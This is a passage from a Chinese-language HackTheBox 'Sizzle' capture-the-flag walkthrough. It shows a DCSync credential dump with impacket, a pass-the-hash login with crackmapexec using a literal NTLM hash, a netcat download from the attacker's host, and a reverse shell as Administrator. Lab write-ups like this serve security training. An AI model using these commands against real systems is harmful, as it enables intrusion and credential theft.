tabindex="0" class="nm nn di no bf np"><div class="gh gi oi"><img src="../Images/ec26d8fa80eef6f21aa789343792c2f6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*B_B4ykSTeeWDxzIIvm9b2Q.png"/></div></div></figure><p id="5fad" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查<code class="fe mj mk ml mm b">C:\Users</code>目录下的文件:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="29c2" class="kx ky iq mm b gy mv mw l mx my">gci -path c:\users\ -recurse -depth 3</span></pre><p id="608b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我现在可以访问<code class="fe mj mk ml mm b">user.txt:</code></p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi pt"><img src="../Images/10df161cafadd67720ae82fd35b6a172.png" data-original-src="https://miro.medium.com/v2/resize:fit:1004/format:webp/1*8LEF3By4MiFt_a7K3IYoBQ.png"/></div></figure><h2 id="b798" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">DCSync:</h2><p id="0641" class="pw-post-body-paragraph jz ka iq kb b kc ls ke kf kg lt ki kj kk mg km kn ko mh kq kr ks mi ku kv kw ij bi translated">知道机器上运行了一些安全控制，我决定只使用impacket的<code class="fe mj mk ml mm b">secretsdump.py</code>,而不是在机器上使用Mimikatz:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="3d36" class="kx ky iq mm b gy mv mw l mx my">/opt/impacket/examples/secretsdump.py htb/mrlky@10.10.10.103</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pu"><img src="../Images/e9c9eca5948847f2865c5ceee7811a2d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hpjItDYCtIT1jNUb0lt-NQ.png"/></div></div></figure><p id="c936" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我现在有了所有用户的散列。然后我尝试使用impacket中的<code class="fe mj mk ml mm b">psexec.py</code>来执行命令，如<code class="fe mj mk ml mm b">Administrator</code>:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="66e1" class="kx ky iq mm b gy mv mw l mx my">/opt/impacket/examples/psexec.py htb/administrator@10.10.10.103 whoami -hashes :f6b7160bfc91823792e0ac3a162c9267</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pv"><img src="../Images/0f2e7b68f512e0484901c0d9492126e0.png" data-original-src="https://miro.medium.com/v2/resize:fit:772/format:webp/1*3r79qjt3j7k_Hg3k8Lpleg.png"/></div></div></figure><p id="1595" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">可惜就是挂了。然后我使用<code class="fe mj mk ml mm b">cme</code>运行命令<code class="fe mj mk ml mm b">hostname</code>，使用<code class="fe mj mk ml mm b">-x</code>标志:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="faf1" class="kx ky iq mm b gy mv mw l mx my">sudo /opt/cme smb 10.10.10.103 -d HTB -u administrator -H f6b7160bfc91823792e0ac3a162c9267 -x hostname</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pw"><img src="../Images/e2d84fc419db49c18e42c13362e9e4c7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Wm_KCdQ-JTZkHeqq1KbfdQ.png"/></div></div></figure><p id="17cf" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我得到了<code class="fe mj mk ml mm b">sizzle</code>的响应，这意味着一切看起来都很好。然后，我尝试使用<code class="fe mj mk ml mm b">-X</code>标志通过PowerShell执行一个命令:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="6c09" class="kx ky iq mm b gy mv mw l mx my">sudo /opt/cme smb 10.10.10.103 -d HTB -u administrator -H f6b7160bfc91823792e0ac3a162c9267 -X gci</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi px"><img src="../Images/c075ec36249b99b43f61186f73a3d99e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YZIXvRojDG8loU9KbKj0Dg.png"/></div></div></figure><p id="e712" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我得到了我所期待的。我现在可以简单地上传一个<code class="fe mj mk ml mm b">netcat</code>可执行文件，并使用它获得一个反向shell。我在SIZZLE机器上下载了一个可执行文件:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="5811" class="kx ky iq mm b gy mv mw l mx my">iwr -uri <a class="ae jy" href="http://10.10.14.3/nc.exe" rel="noopener ugc nofollow" target="_blank">http://10.10.14.3/nc.exe</a> -outfile nc.exe</span></pre><p id="b9f4" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我在我的Kali上设置了我的监听器:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="451b" class="kx ky iq mm b gy mv mw l mx my">rlwrap nc -nlvp 9001</span></pre><blockquote class="nc nd ne"><p id="c02e" class="jz ka na kb b kc kd ke kf kg kh ki kj nf kl km kn ng kp kq kr nh kt ku kv kw ij bi translated">注意:我使用rlwrap，这样当我得到一个shell时就可以使用箭头键。</p></blockquote><p id="9a47" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我执行一个命令，使用cme启动到我的监听器的连接:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="2cbc" class="kx ky iq mm b gy mv mw l mx my">sudo /opt/cme smb 10.10.10.103 -d HTB -u administrator -H f6b7160bfc91823792e0ac3a162c9267 -X "c:\windows\system32\spool\drivers\color\nc.exe 10.10.14.3 9001 -e cmd.exe"</span></pre><p id="0148" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">在我的监听器上，我得到一个连接。我确认我在主机SIZZLE上以<code class="fe mj mk ml mm b">Administrator</code>的身份运行。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi py"><img src="../Images/869eb9287566e848914ff1dd27420a80.png" data-original-src="https://miro.medium.com/v2/resize:fit:1084/format:webp/1*ogSAIwJIJERCQifRfKjcyg.png"/></div></figure><p id="ac46" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我现在可以在<code class="fe mj mk ml mm b">Administrator\Desktop</code>下面列出文件，并在那里找到root.txt:</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi pz"><img src="../Images/73fb12116c85e8a050180d078e60f615.png" data-original-src="https://miro.medium.com/v2/resize:fit:882/format:webp/1*xkP9Dh5Ka_nlX015WD2HRA.png"/></div></figure><p id="bac8" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">这就是我如何解决HacktheBox的Sizzle问题！这是一个可怕的旅程，但绝对值得！感谢阅读！🍺</p></div></div>    
</body>
</html>